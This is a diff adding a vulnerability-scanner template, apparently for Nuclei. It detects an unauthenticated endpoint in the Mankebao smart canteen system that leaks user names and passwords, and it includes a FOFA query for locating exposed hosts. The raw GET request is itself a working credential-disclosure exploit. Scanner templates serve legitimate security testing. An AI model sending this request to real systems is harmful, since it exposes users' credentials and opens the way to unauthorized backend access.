@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - password
+            - userName
+            - '"success":true'
+            - '"result":['
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
+          Host: {{Hostname}}
+id: mankebao-selectUserByOrgId-unauthorized
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="-409875651"
+        由于满客宝智慧食堂系统 selectUserByOrgId 接口处未进行权限控制，导致未经身份验证的远程攻击者可以未授权访问，泄露系统用户账号密码等信息，进一步破解即可登录系统后台，使系统处于极不安全的状态。
+    name: 满客宝智慧食堂系统 selectUserByOrgId 未授权访问
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485546&idx=1&sn=513586a8d84eaf2b143b06ecd97c9a4b&chksm=c267bd59f510344f83a5d9830a0105afc9529578bbb0e6b700b2abe321b2f36c07f9c349f6c5&token=1439003696&lang=zh_CN#rd
+    severity: high
+    tags:
+        - unauthorized
+        - ecor
+        - ECOR
